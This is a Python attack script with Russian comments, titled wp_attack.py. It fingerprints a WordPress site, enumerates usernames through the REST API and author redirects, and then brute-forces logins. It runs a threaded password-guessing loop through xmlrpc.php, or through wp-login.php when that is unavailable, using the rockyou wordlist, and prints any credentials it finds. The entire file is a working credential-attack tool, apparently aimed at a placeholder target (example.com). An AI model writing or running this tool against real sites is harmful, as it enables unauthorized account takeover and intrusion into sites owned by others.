#!/usr/bin/env python3
"""
wp_attack.py — разведка и брутфорс WordPress для конкретного сайта.
Использование: python wp_attack.py rockyou.txt
"""
import re
import requests
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings()

TARGET = "example.com"
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}


def fingerprint():
    print(f"[*] Разведка {TARGET}")
    r = requests.get(TARGET, headers=UA, timeout=15, verify=False)
    print(f"[+] Статус: {r.status_code}")

    if "wp-content" in r.text or "wp-includes" in r.text:
        print("[+] Подтверждено: WordPress")
    else:
        print("[?] Признаки WP слабые, но wp-login.php есть")

    m = re.search(r'<meta name="generator" content="WordPress ([\d.]+)"', r.text)
    if m:
        print(f"[+] Версия WP: {m.group(1)}")

    plugins = list(set(re.findall(r"wp-content/plugins/([^/]+)/", r.text)))
    theme = re.search(r"wp-content/themes/([^/]+)/", r.text)

    print(f"[+] Тема: {theme.group(1) if theme else 'скрыта'}")
    print(f"[+] Плагины: {plugins or 'не найдены'}")
    return plugins


def enum_users():
    print("[*] Перебор пользователей")
    users = set()

    # REST API
    try:
        r = requests.get(f"{TARGET}/wp-json/wp/v2/users", headers=UA,
                         timeout=15, verify=False)
        if r.status_code == 200:
            for u in r.json():
                users.add(u["slug"])
                print(f"    [+] REST: {u['slug']} (id={u.get('id')})")
    except Exception as e:
        print(f"    [-] REST не сработал: {e}")

    # Fallback через ?author=N
    if not users:
        for i in range(1, 11):
            try:
                r = requests.get(f"{TARGET}/?author={i}", headers=UA,
                                 timeout=10, allow_redirects=True, verify=False)
                m = re.search(r"/author/([^/]+)/", r.url)
                if m:
                    users.add(m.group(1))
                    print(f"    [+] author={i} -> {m.group(1)}")
            except:
                pass

    print(f"[+] Итого логинов: {list(users)}")
    return list(users)


def check_xmlrpc():
    try:
        r = requests.get(f"{TARGET}/xmlrpc.php", headers=UA, timeout=10, verify=False)
        if r.status_code == 200 and "XML-RPC" in r.text:
            print("[+] xmlrpc.php доступен — используем быстрый брутфорс")
            return True
    except:
        pass
    print("[-] xmlrpc.php недоступен — используем wp-login.php")
    return False


def bruteforce_xmlrpc(user, passwords):
    url = f"{TARGET}/xmlrpc.php"
    tpl = """<?xml version="1.0"?><methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params><param><value><string>{u}</string></value></param>
<param><value><string>{p}</string></value></param></params></methodCall>"""

    def try_pass(p):
        try:
            r = requests.post(url, data=tpl.format(u=user, p=p),
                              headers={"Content-Type": "text/xml"},
                              timeout=20, verify=False)
            if "faultCode" not in r.text:
                return p
        except:
            pass
        return None

    with ThreadPoolExecutor(max_workers=20) as ex:
        for res in ex.map(try_pass, passwords):
            if res:
                return res
    return None


def bruteforce_wplogin(user, passwords):
    url = f"{TARGET}/wp-login.php"
    sess = requests.Session()

    for p in passwords:
        try:
            r = sess.post(url, data={
                "log": user, "pwd": p, "wp-submit": "Log In",
                "redirect_to": f"{TARGET}/wp-admin/", "testcookie": "1"
            }, headers=UA, timeout=20, verify=False, allow_redirects=False)

            # Успех: 302 на wp-admin + cookie wordpress_logged_in
            if r.status_code == 302 and "wp-admin" in r.headers.get("Location", ""):
                return p
            if any("wordpress_logged_in" in c.name for c in sess.cookies):
                return p
        except:
            pass
    return None


def main(wordlist="rockyou.txt"):
    fingerprint()
    users = enum_users() or ["admin"]

    with open(wordlist, encoding="utf-8", errors="ignore") as f:
        passwords = [l.strip() for l in f if l.strip()]
    print(f"[*] Загружено паролей: {len(passwords)}")

    use_xmlrpc = check_xmlrpc()

    for user in users:
        print(f"\n[*] Брутфорс пользователя: {user}")
        if use_xmlrpc:
            pwd = bruteforce_xmlrpc(user, passwords)
        else:
            pwd = bruteforce_wplogin(user, passwords)

        if pwd:
            print(f"\n[+++] УСПЕХ: {user}:{pwd}")
            print(f"[+] Вход: {TARGET}/wp-admin/")
            return
        else:
            print(f"[-] Пароль для {user} не найден")


if __name__ == "__main__":
    import sys
    wl = sys.argv[1] if len(sys.argv) > 1 else "rockyou.txt"
    main(wl)